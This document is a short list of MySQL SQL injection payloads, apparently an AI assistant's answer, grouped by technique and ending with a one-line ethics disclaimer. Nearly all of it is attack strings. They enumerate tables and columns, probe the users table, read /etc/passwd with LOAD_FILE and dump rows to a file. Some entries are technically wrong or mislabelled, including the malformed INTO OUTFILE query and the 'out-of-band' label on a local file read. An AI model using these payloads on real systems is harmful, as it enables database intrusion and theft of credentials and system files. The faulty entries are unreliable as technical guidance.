    Basic Union-Based Traversal:
        ' UNION SELECT 1,2,3 --
        ' UNION SELECT table_name,2,3 FROM information_schema.tables --

    Union-Based Traversal with Column Enumeration:
        ' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name = 'users' --
        ' UNION SELECT table_name,column_name,3 FROM information_schema.columns --

    Error-Based Traversal:
        1' AND (SELECT 1/0 FROM users) --
        1' AND (SELECT count(*) FROM information_schema.tables) > 0 --

    Time-Based Traversal:
        1' AND sleep(5) --
        1' AND (SELECT COUNT(*) FROM users WHERE username = 'admin' AND BENCHMARK(5000000, MD5(1))) --

    Out-of-Band Traversal:
        1'; SELECT LOAD_FILE('/etc/passwd') --
        1'; SELECT INTO OUTFILE '/tmp/output.txt' LINES TERMINATED BY 0x0a SELECT * FROM users --

    Subquery Traversal:
        1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1), FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) AS y) --

    Function-Based Traversal:
        1' AND (SELECT COUNT(*) FROM users WHERE SUBSTRING(username, 1, 1) = 'a') > 0 --
        1' AND (SELECT COUNT(*) FROM users WHERE LEFT(username, 1) = 'a') > 0 --

These examples demonstrate various techniques to perform MySQL database traversal. However, it's essential to remember that proper authorization and legal permission are necessary before conducting any database traversal activities. Always ensure you adhere to ethical guidelines and use these techniques responsibly.
